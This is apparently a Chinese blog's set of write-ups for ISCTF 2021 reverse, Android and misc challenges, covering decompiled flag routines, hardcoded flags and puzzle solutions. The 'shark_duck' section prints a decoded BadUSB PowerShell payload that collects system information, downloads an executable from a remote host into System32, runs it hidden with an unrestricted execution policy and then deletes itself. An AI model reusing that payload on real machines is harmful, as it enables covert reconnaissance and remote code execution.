<p><img src="https://i.loli.net/2021/11/04/OwJ57K4C3kX1tcN.png" alt="3.png"></p>
<p>直接定位到主要逻辑</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Security.Cryptography;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.Events;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.UI;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Token: 0x0200000E RID: 14</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ScoreAndFlag</span> :</span> MonoBehaviour</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Token: 0x06000032 RID: 50 RVA: 0x0000226A File Offset: 0x0000046A</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.scoreTxt.text = <span class="keyword">this</span>.score.<span class="built_in">ToString</span>() + <span class="string">&quot;/100000&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000033 RID: 51 RVA: 0x00002A2C File Offset: 0x00000C2C</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.score &gt;= <span class="number">100000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.WinPanel.<span class="built_in">SetActive</span>(<span class="literal">true</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (Input.<span class="built_in">GetKeyDown</span>(KeyCode.Escape))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.exitBtn.onClick.<span class="built_in">AddListener</span>(<span class="keyword">new</span> <span class="built_in">UnityAction</span>(<span class="keyword">this</span>.ExitGame));</span><br><span class="line">			<span class="keyword">this</span>.exitPanel.<span class="built_in">SetActive</span>(<span class="literal">true</span>);</span><br><span class="line">			<span class="keyword">this</span>.backBtn.onClick.<span class="built_in">AddListener</span>(<span class="keyword">new</span> <span class="built_in">UnityAction</span>(<span class="keyword">this</span>.BackToGame));</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000034 RID: 52 RVA: 0x00002A9C File Offset: 0x00000C9C</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ScoreAdd</span><span class="params">(<span class="keyword">int</span> value)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.score += value;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.score &lt;= <span class="number">100000</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.scoreGoal++;</span><br><span class="line">			<span class="keyword">this</span>.EC.waitTime /= <span class="number">1.2f</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">this</span>.score &gt;= <span class="number">100000</span> &amp;&amp; <span class="keyword">this</span>.scoreGoal &gt;= <span class="number">300</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">this</span>.f1ag.text = <span class="string">&quot;ISCTF&#123;&quot;</span> + ScoreAndFlag.<span class="built_in">md5</span>(ScoreAndFlag.<span class="built_in">SHA1</span>(<span class="string">&quot;2010&quot;</span>)) + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.scoreTxt.text = <span class="keyword">this</span>.score.<span class="built_in">ToString</span>() + <span class="string">&quot;/100000&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000035 RID: 53 RVA: 0x0000228C File Offset: 0x0000048C</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> string <span class="title">SHA1</span><span class="params">(string content)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> ScoreAndFlag.<span class="built_in">SHA1</span>(content, Encoding.UTF8);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000036 RID: 54 RVA: 0x00002B44 File Offset: 0x00000D44</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> string <span class="title">SHA1</span><span class="params">(string content, Encoding encode)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		string result;</span><br><span class="line">		<span class="keyword">try</span></span><br><span class="line">		&#123;</span><br><span class="line">			SHA1CryptoServiceProvider sha1CryptoServiceProvider = <span class="keyword">new</span> <span class="built_in">SHA1CryptoServiceProvider</span>();</span><br><span class="line">			byte[] bytes = encode.<span class="built_in">GetBytes</span>(content);</span><br><span class="line">			byte[] value = sha1CryptoServiceProvider.<span class="built_in">ComputeHash</span>(bytes);</span><br><span class="line">			sha1CryptoServiceProvider.<span class="built_in">Dispose</span>();</span><br><span class="line">			result = BitConverter.<span class="built_in">ToString</span>(value).<span class="built_in">Replace</span>(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>).<span class="built_in">ToUpper</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in"><span class="keyword">catch</span></span> (Exception ex)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;SHA1加密出错：&quot;</span> + ex.Message);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000037 RID: 55 RVA: 0x00002BB0 File Offset: 0x00000DB0</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> string <span class="title">md5</span><span class="params">(string str)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		byte[] bytes = Encoding.UTF8.<span class="built_in">GetBytes</span>(str);</span><br><span class="line">		byte[] array = MD5.<span class="built_in">Create</span>().<span class="built_in">ComputeHash</span>(bytes);</span><br><span class="line">		StringBuilder stringBuilder = <span class="keyword">new</span> <span class="built_in">StringBuilder</span>();</span><br><span class="line">		foreach (byte b in array)</span><br><span class="line">		&#123;</span><br><span class="line">			stringBuilder.<span class="built_in">Append</span>(b.<span class="built_in">ToString</span>(<span class="string">&quot;X2&quot;</span>));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> stringBuilder.<span class="built_in">ToString</span>().<span class="built_in">Substring</span>(<span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000038 RID: 56 RVA: 0x00002299 File Offset: 0x00000499</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ExitGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		Application.<span class="built_in">Quit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x06000039 RID: 57 RVA: 0x000022A0 File Offset: 0x000004A0</span></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BackToGame</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.exitPanel.<span class="built_in">SetActive</span>(<span class="literal">false</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000033 RID: 51</span></span><br><span class="line">	<span class="keyword">public</span> Text scoreTxt;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000034 RID: 52</span></span><br><span class="line">	<span class="keyword">public</span> Text f1ag;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000035 RID: 53</span></span><br><span class="line">	<span class="keyword">public</span> GameObject WinPanel;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000036 RID: 54</span></span><br><span class="line">	<span class="keyword">public</span> GameObject exitPanel;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000037 RID: 55</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">int</span> score;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000038 RID: 56</span></span><br><span class="line">	<span class="keyword">public</span> Button exitBtn;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x04000039 RID: 57</span></span><br><span class="line">	<span class="keyword">public</span> Button backBtn;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400003A RID: 58</span></span><br><span class="line">	<span class="keyword">public</span> EnemyCreate EC;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Token: 0x0400003B RID: 59</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> scoreGoal = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以直接把加密代码抄下来跑，也可以修改拿到flag的条件</p>
<p><img src="https://i.loli.net/2021/11/04/cs9nqQVyKGCe5uI.png" alt="7DHX9CV.png"></p>
<p><img src="https://i.loli.net/2021/11/04/z9Ktfa5SQCpBrog.png" alt="3V.png"></p>
<hr>
<h2 id="O0oOoo-level1"><a href="#O0oOoo-level1" class="headerlink" title="O0oOoo-level1"></a><strong>O0oOoo-level1</strong></h2><p>丢进ida，可以看到checkflag函数，然后我发现好多变量，好多数字，我看不懂</p>
<p>后面知道了这是6组5元一次方程，就能看懂了，还是见识少了</p>
<p>可以用mathematic跑方程，把唯一一个&gt;&gt;6 改成*64即可</p>
<p>也可以用z3收束求解，都挺好用，都可以用</p>
<p>出来的数字ascii码转字符就行</p>
<hr>
<h2 id="简单的re"><a href="#简单的re" class="headerlink" title="简单的re"></a>简单的re</h2><p>就很简单，记事本打开即可找到flag</p>
<hr>
<h2 id="Reverse-Easy-JAR"><a href="#Reverse-Easy-JAR" class="headerlink" title="Reverse-Easy_JAR"></a><strong>Reverse-Easy_JAR</strong></h2><p>附件是.jar，所以用jadx打开，可以很清晰地看到是用base64解码后和ctf异或，当时对python异或不熟，对c语言base64不熟，写脚本写了好久没成功，后面用CyberChef才弄好</p>
<p>然后看别人的wp居然还能用php写逆向脚本，tql</p>
<hr>
<ul>
<li>能复现的都在这里了，web都是没什么必要记录的简单题，pwn我能做出来的也是没什么必要记录的。</li>
<li>写这篇的时候找了个人组队做题，有人讨论，分享做出题目的激动的感觉还是不错的，比一个人打好多了。</li>
</ul>
]]></content>
      <tags>
        <tag>re</tag>
      </tags>
  </entry>
  <entry>
    <title>ISCTFandroidwp</title>
    <url>/2021/11/05/ISCTFandroidwp/</url>
    <content><![CDATA[<p>只出了2道且都挺简单的安卓逆向</p>
<span id="more"></span> 

<h2 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a><strong>猜数字</strong></h2><p>安装一下，看到就是让猜数字，flag随机给</p>
<p>用JADX打开，定位 tk.mcsog.isctfgetflag 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private String flag1 = &quot;ISCT&quot;;</span><br><span class="line">private String flag10 = &quot;2f70&quot;;</span><br><span class="line">private String flag11 = &quot;7b&#125;&quot;;</span><br><span class="line">private String flag2 = &quot;F&#123;5e&quot;;</span><br><span class="line">private String flag3 = &quot;c072&quot;;</span><br><span class="line">private String flag4 = &quot;15-7&quot;; </span><br><span class="line">private String flag5 = &quot;16f-&quot;;</span><br><span class="line">private String flag6 = &quot;498a&quot;;</span><br><span class="line">private String flag7 = &quot;-85a&quot;;</span><br><span class="line">private String flag8 = &quot;d-5f&quot;;</span><br><span class="line">private String flag9 = &quot;3932&quot;;</span><br></pre></td></tr></table></figure>

<p>可以看到这些，拼起来就是flag</p>
<p>ISCTF{5ec07215-716f-498a-85ad-5f39322f707b} </p>
<p>这题甚至还能直接看smali，可以找到按顺序排好但还是很多段的flag</p>
<hr>
<h2 id="锁机病毒"><a href="#锁机病毒" class="headerlink" title="锁机病毒"></a><strong>锁机病毒</strong></h2><p>JADX打开，定位到 tk.mcsog.isctflock 函数</p>
<p>但是没直接看到什么东西</p>
<p>那再看看.so依赖库，可以看到一个函数是</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> __cdecl <span class="title">Java_tk_mcsog_isctflock_MainActivity_check</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"> <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// esi </span></span><br><span class="line"> <span class="keyword">bool</span> v5; <span class="comment">// [esp+Bh] [ebp-11h] </span></span><br><span class="line"> v3 = (<span class="keyword">const</span> <span class="keyword">char</span> *)(*(<span class="built_in"><span class="keyword">int</span></span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>); </span><br><span class="line"> v5 = <span class="built_in">strcmp</span>(<span class="string">&quot;173572&quot;</span>, v3) == <span class="number">0</span>; </span><br><span class="line"> (*(<span class="built_in"><span class="keyword">void</span></span> (__cdecl **)(<span class="keyword">int</span>, <span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> *))(*(_DWORD *)a1 + <span class="number">680</span>))(a1, a3, v3);</span><br><span class="line"> <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>安装一下，发现原来就输个密码就行</p>
<p>173572就是密码</p>
<p><img src="https://i.loli.net/2021/11/04/TgPUC1oIW7yziRZ.png" alt="5HR0.png"></p>
<hr>
<ul>
<li>这个android就很新生赛，这比赛隔壁re的0解题拿着wp我都复现不动</li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>2021ISCTFmiscwp，要么题白给，要么我白给</title>
    <url>/2021/10/28/2021ISCTFmiscwp%EF%BC%8C%E8%A6%81%E4%B9%88%E9%A2%98%E7%99%BD%E7%BB%99%EF%BC%8C%E8%A6%81%E4%B9%88%E6%88%91%E7%99%BD%E7%BB%99/</url>
    <content><![CDATA[<p>总结一下，会做的题很快白给，不会的好歹长了见识</p>
<span id="more"></span> 

<h2 id="女神的嘲讽"><a href="#女神的嘲讽" class="headerlink" title="女神的嘲讽"></a>女神的嘲讽</h2><p>打开txt</p>
<p><img src="https://i.loli.net/2021/10/27/aFkbnfXzRSDBrsM.png" alt="67.png"></p>
<p>就，他都说了ook了，想想ook长什么样，丢进word里ctrl+H文本替换一下，然后转码，</p>
<p>得到一串base64，转一下就行</p>
<hr>
<h2 id="你下载的真的是图片吗？"><a href="#你下载的真的是图片吗？" class="headerlink" title="你下载的真的是图片吗？"></a>你下载的真的是图片吗？</h2><p>foremost文件分离，拿到压缩包，拿到图，拿到flag</p>
<hr>
<h2 id="Misc签到"><a href="#Misc签到" class="headerlink" title="Misc签到"></a>Misc签到</h2><p><img src="https://i.loli.net/2021/10/27/k3RYblvLC2AXn15.png" alt="NW.png"></p>
<p>这题按题目描述，不用口算md5，口算一下base64编码转换就行</p>
<hr>
<h2 id="我裂开了"><a href="#我裂开了" class="headerlink" title="我裂开了"></a>我裂开了</h2><p><img src="https://i.loli.net/2021/10/27/uazbKPvonjsFI2q.png" alt="3W.png"></p>
<p>拼一下或者直接搜蓝鲨信息微信公众号，然后发ISCTF就行</p>
<hr>
<h2 id="登陆流量分析"><a href="#登陆流量分析" class="headerlink" title="登陆流量分析"></a>登陆流量分析</h2><p><img src="https://i.loli.net/2021/10/27/HahZRbGd4pySzFg.png" alt="RC4.png"></p>
<p>一个记录了登录的流量包，可以找到账号密码再找到网站登录</p>
<p>也可以直接找到流量里的flag</p>
<p><img src="https://i.loli.net/2021/10/27/WglNBk3FKHeL9On.png" alt="A7WL.png"></p>
<hr>
<h2 id="简单图片隐写术"><a href="#简单图片隐写术" class="headerlink" title="简单图片隐写术"></a>简单图片隐写术</h2><p><img src="https://i.loli.net/2021/10/27/JD6zjahcqG97NR3.png" alt="WQP.png"></p>
<p>一张非常大的png，我还以为是里面有东西，010打开发现都是没意义的东西，所以其实直接在010或者记事本ctrl+F就能找到flag</p>
<hr>
<h2 id="easy-osint"><a href="#easy-osint" class="headerlink" title="easy_osint"></a>easy_osint</h2><p>拿到图</p>
<p><img src="https://i.loli.net/2021/10/27/J6Ei9SBmNF1HDX8.png" alt="1TD.png"></p>
<p>用百度搜图或者别的应该也都能搜到，</p>
<p><img src="https://i.loli.net/2021/10/27/LqNHVAYJT8od3UW.png" alt="WEIMW2G.png"></p>
<p>然后就直接找到了</p>
<hr>
<h2 id="受伤的二维码和耳朵"><a href="#受伤的二维码和耳朵" class="headerlink" title="受伤的二维码和耳朵"></a>受伤的二维码和耳朵</h2><p>二维码直接拼图：</p>
<p><img src="https://i.loli.net/2021/10/27/avAHKO13J4fF2so.png" alt="4BBPJ3.png"></p>
<p>然后音频是摩斯密码，直接解密，两端拼接在一起，得到flag</p>
<hr>
<h2 id="Welcome-To-ISCTF-World"><a href="#Welcome-To-ISCTF-World" class="headerlink" title="Welcome To ISCTF World"></a>Welcome To ISCTF World</h2><p>minecraft客户端，是个迷宫地图，</p>
<p>当然，可以直接开局域网，开启作弊，然后观察者模式就能找牌子了，正常玩也能找齐</p>
<p><img src="https://i.loli.net/2021/10/27/GbvD2tXhKmIi7gp.png" alt="0TAKWFQ.png"></p>
<p><img src="https://i.loli.net/2021/10/27/36qd2mwLfExvU7K.png" alt="5P.png"></p>
<p><img src="https://i.loli.net/2021/10/27/4rh6LAyqBdYVRJM.png" alt="UA2FNL.png"></p>
<p><img src="https://i.loli.net/2021/10/27/ROM5dr7jUDcGxXh.png" alt="89.png"></p>
<p>最后一段一看就是base64，解一下拼起来就行</p>
<hr>
<h2 id="文件？美女？"><a href="#文件？美女？" class="headerlink" title="文件？美女？"></a>文件？美女？</h2><p>这题没做出来有点可惜</p>
<p><img src="https://i.loli.net/2021/10/27/sBTNfaemw5PJySQ.png" alt="M.png"></p>
<p>正常打不开，用010打开翻到尾部可以看到很明显的，JFIF反了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag1&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> g:</span><br><span class="line">        g.write(f.read()[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure>

<p>用python倒回去</p>
<p>然后foremost，得到加密的压缩包，弱口令爆破即可</p>
<hr>
<h2 id="shark-duck"><a href="#shark-duck" class="headerlink" title="shark_duck"></a>shark_duck</h2><p><a href="https://ducktoolkit.com/%E9%9C%80%E8%A6%81%E7%94%A8%E5%88%B0%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99">https://ducktoolkit.com/需要用到这个网站</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTER $folderDateTime = (get-date).ToString(&#x27;d-M-y HHmmss&#x27;)ENTER $userDir = (Get-ChildItem env:\userprofile).value + &#x27;\Ducky Report &#x27; + $folderDateTimeENTER $fileSaveDir = New-Item ($userDir) -ItemType DirectoryENTER $date = get-dateENTER</span><br><span class="line">$style = &quot;&lt;style&gt; table td&#123;padding-right: 10px;text-align: left;&#125;#body &#123;padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;&#125;#left&#123;float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;&#125;#right&#123;background- color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;&#125;#center&#123;background- color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;&#125; &lt;/style&gt;&quot;ENTER $Report = ConvertTo-Html -Title &#x27;Recon Report&#x27; -Head $style &gt; $fileSaveDir&#x27;/ComputerInfo.html&#x27;ENTER $Report = $Report + &quot;&lt;div id=body&gt;&lt;h1&gt;Duck Tool Kit Report&lt;/h1&gt;&lt;hr size=2&gt;&lt;br&gt; &lt;h3&gt; Generated on: $Date &lt;/h3&gt;&lt;br&gt;&quot;ENTER $SysBootTime = Get-WmiObject Win32_OperatingSystemENTER $BootTime = $SysBootTime.ConvertToDateTime($SysBootTime.LastBootUpTime)| ConvertTo-Html datetimeENTER $SysSerialNo = (Get-WmiObject -Class Win32_OperatingSystem -ComputerName $env:COMPUTERNAME)ENTER $SerialNo = $SysSerialNo.SerialNumberENTER $SysInfo = Get-WmiObject -class Win32_ComputerSystem -namespace root/CIMV2 | Select Manufacturer,ModelENTER $SysManufacturer = $SysInfo.ManufacturerENTER $SysModel = $SysInfo.ModelENTER $OS = (Get-WmiObject Win32_OperatingSystem -computername $env:COMPUTERNAME ).captionENTER $disk = Get-WmiObject Win32_LogicalDisk -Filter &quot;DeviceID=&#x27;C:&#x27;&quot;ENTER $HD = [math]::truncate($disk.Size / 1GB)ENTER $FreeSpace = [math]::truncate($disk.FreeSpace / 1GB)ENTER $SysRam = Get-WmiObject -Class Win32_OperatingSystem -computername $env:COMPUTERNAME | Select TotalVisibleMemorySizeENTER $Ram = [Math]::Round($SysRam.TotalVisibleMemorySize/1024KB)ENTER $SysCpu = Get-WmiObject Win32_Processor | Select NameENTER $Cpu = $SysCpu.NameENTER $HardSerial = Get-WMIObject Win32_BIOS -Computer $env:COMPUTERNAME | select SerialNumberENTER $HardSerialNo = $HardSerial.SerialNumberENTER $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select NameENTER $graphicsCard = gwmi win32_VideoController |select NameENTER $graphics = $graphicsCard.NameENTER $SysCdDrive = Get-WmiObject Win32_CDROMDrive |select -first 1ENTER $DriveLetter = $CDDrive.DriveENTER $DriveName = $CDDrive.CaptionENTER $Disk = $DriveLetter + &#x27;\&#x27; + $DriveNameENTER $Firewall = New-Object -com HNetCfg.FwMgrENTER $FireProfile = $Firewall.LocalPolicy.CurrentProfileENTER $FireProfile = $FireProfile.FirewallEnabledENTER $Report = $Report + &quot;&lt;div id=left&gt;&lt;h3&gt;Computer Information&lt;/h3&gt;&lt;br&gt;&lt;table&gt;&lt;tr&gt; &lt;td&gt;Operating System&lt;/td&gt;&lt;td&gt;$OS&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;OS Serial Number:&lt;/td&gt; &lt;td&gt;$SerialNo&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Current User:&lt;/td&gt;&lt;td&gt;$env:USERNAME &lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;System Uptime:&lt;/td&gt;&lt;td&gt;$BootTime&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System Manufacturer: &lt;/td&gt;&lt;td&gt;$SysManufacturer&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System Model:&lt;/td&gt;&lt;td&gt;$SysModel&lt;/td&gt; &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Serial Number:&lt;/td&gt;&lt;td&gt;$HardSerialNo&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Firewall is Active:&lt;/td&gt;&lt;td&gt;$FireProfile&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;div id=right&gt;&lt;h3&gt;Hardware Information&lt;/h3&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Hardrive Size:&lt;/td&gt;&lt;td&gt;$HD GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt; &lt;td&gt;Hardrive Free Space:&lt;/td&gt;&lt;td&gt;$FreeSpace GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;System RAM:&lt;/td&gt; &lt;td&gt;$Ram GB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Processor:&lt;/td&gt;&lt;td&gt;$Cpu&lt;/td&gt;&lt;/tr&gt;&lt;td&gt;CD Drive:&lt;/td&gt; &lt;td&gt;$Disk&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Graphics Card:&lt;/td&gt;&lt;td&gt;$graphics&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt; &lt;/div&gt;&quot;ENTER</span><br><span class="line">$u = 0ENTER $allUsb = @(get-wmiobject win32_volume | select Name, Label, FreeSpace)ENTER $Report = $Report + &#x27;&lt;div id=right&gt;&lt;h3&gt;USB Devices&lt;/h3&gt;&lt;table&gt;&#x27;ENTER do &#123;ENTER $gbUSB = [math]::truncate($allUsb[$u].FreeSpace / 1GB)ENTER $Report = $Report + &quot;&lt;tr&gt;&lt;td&gt;Drive Name: &lt;/td&gt;&lt;td&gt; &quot; + $allUsb[$u].Name + $allUsb[$u].Label + &quot;&lt;/td&gt;&lt;td&gt;Free Space: &lt;/td&gt;&lt;td&gt;&quot; + $gbUSB + &quot;GB&lt;/td&gt; &lt;/tr&gt;&quot;ENTER Write-Output $fullUSBENTER $u ++ENTER &#125; while ($u -lt $allUsb.Count)ENTER $Report = $Report + &#x27;&lt;/table&gt;&lt;/div&gt;&#x27;ENTER (New-Object Net.Webclient).DownloadFile(&#x27;https://isctf-1257061123.cos.ap- nanjing.myqcloud.com/ISCTF.exe&#x27;,&quot;C:\Windows\System32\16348.exe&quot;); Start-Process -FilePath &quot;C:\Windows\System32\16348.exe&quot;ENTER $Report &gt;&gt; $fileSaveDir&#x27;/ComputerInfo.html&#x27;ENTER function copy-ToZip($fileSaveDir)&#123;ENTER $srcdir = $fileSaveDirENTER $zipFile = &#x27;%temp%\a.txt\Report.zip&#x27;ENTER if(-not (test-path($zipFile))) &#123;ENTER set-content $zipFile (&quot;PK&quot; + [char]5 + [char]6 + (&quot;$([char]0)&quot; * 18))ENTER (dir $zipFile).IsReadOnly = $false&#125;ENTER $shellApplication = new-object -com shell.applicationENTER $zipPackage = $shellApplication.NameSpace($zipFile)ENTER $files = Get-ChildItem -Path $srcdirENTER foreach($file in $files) &#123;ENTER $zipPackage.CopyHere($file.FullName)ENTER while($zipPackage.Items().Item($file.name) -eq $null)&#123;ENTER Start-sleep -seconds 1 &#125;&#125;&#125;ENTER copy-ToZip($fileSaveDir)ENTER remove-item $fileSaveDir -recurseENTER Remove-Item $MyINvocation.InvocationNameENTER DELAY C:\Windows\config-16348.ps1ENTER DELAY DELAY DELAY powershell Start-Process cmd -Verb runAsENTER DELAY DELAY mode con:cols=14 lines=1ENTER ENTER powershell Set-ExecutionPolicy &#x27;Unrestricted&#x27; -Scope CurrentUser - Confirm:$falseENTER DELAY powershell.exe -windowstyle hidden -File C:\Windows\config-16348.ps1ENTER</span><br></pre></td></tr></table></figure>

<p>拿到一份powershell脚本的下载地址</p>
<p><a href="https://isctf-1257061123.cos.ap-nanjing.myqcloud.com/ISCTF.exe">https://isctf-1257061123.cos.ap-nanjing.myqcloud.com/ISCTF.exe</a></p>
<p>下载，自解压，</p>
<p><img src="https://i.loli.net/2021/10/27/2MZ1BCob9scdRLW.png" alt="N.png"></p>
<p>base64解码+utf8解码就行</p>
<p>然后我当时卡在了utf8解码，我也不知道为什么当时没找到工具，可能太晚了脑子有点不清醒，很可惜，就差一步</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;\u-65463?\u-65453?\u-65469?\u-65452?\u-65466?\u-65413?\u-65436?\u-65487?\u-65468? \u-65441?\u-65415?\u-65488?\u-65419?\u-65441?\u-65460?\u-65487?\u-65461?\u-65467? \u-65441?\u-65419?\u-65426?\u-65431?\u-65437?\u-65488?\u-65436?\u-65467?\u-65471? \u-65426?\u-65436?\u-65468?\u-65419?\u-65437?\u-65429?\u-65473?\u-65411?&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>.split(<span class="string">&#x27;?&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">list</span> = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">   <span class="built_in">list</span>.append(<span class="number">65536</span>-<span class="built_in">int</span>(i[<span class="number">3</span>:]))</span><br><span class="line">r = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">   r += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure>

<p>↑抄来的utf8解码脚本，解了就是flag</p>
<hr>
<h2 id="你下载的真是图片吗？2"><a href="#你下载的真是图片吗？2" class="headerlink" title="你下载的真是图片吗？2"></a>你下载的真是图片吗？2</h2><p>能用stegsolve看到只有蓝色通道有东西</p>
<p>但是我不会操作了</p>
